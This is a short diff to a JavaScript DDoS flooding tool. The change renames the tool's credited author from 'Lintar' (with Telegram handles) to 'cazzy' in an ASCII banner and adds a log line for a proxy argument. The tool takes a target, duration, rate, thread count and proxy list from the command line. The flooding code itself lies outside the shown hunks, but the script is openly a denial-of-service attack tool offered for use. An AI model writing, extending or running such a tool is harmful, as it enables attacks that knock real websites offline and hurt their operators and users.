@@ -1234,10 +1234,10 @@ headers["x-requested-with"] = "XMLHttpRequest";
  }
 console.clear()
 console.log(`
-    
+         
              ╚╦════════════════════════════════════════╦╝
            ╔══╩════════════════════════════════════════╩═══╗
-             Method DDoS By t.me/Lintar21 | t.me/LIService
+                      Method DDoS By | CazzySoci
            ╚══╦═════════════════════════════════════════╦══╝
               ╚═════════════════════════════════════════╝
 `)
@@ -1245,9 +1245,10 @@ console.log(`[@cazzy] Target: `+ process.argv[2])
 console.log(`[@cazzy] Time: `+ process.argv[3])
 console.log(`[@cazzy] Rate: `+ process.argv[4])
 console.log(`[@cazzy] Thread: ` + process.argv[5])
+console.log(`[@cazzy] Proxy: ` + process.argv[6])
 console.log(`[@cazzy] Request: GET`)
-console.log(`[@cazzy] Methods: Lintarv6`)
-console.log(`[@cazzy] Methods DDoS By Lintar`)
+console.log(`[@cazzy] Methods: cazzy`)
+console.log(`[@cazzy] Methods DDoS By cazzy`)
 
  const KillScript = () => process.exit(1);
  setTimeout(KillScript, args.time * 1000);
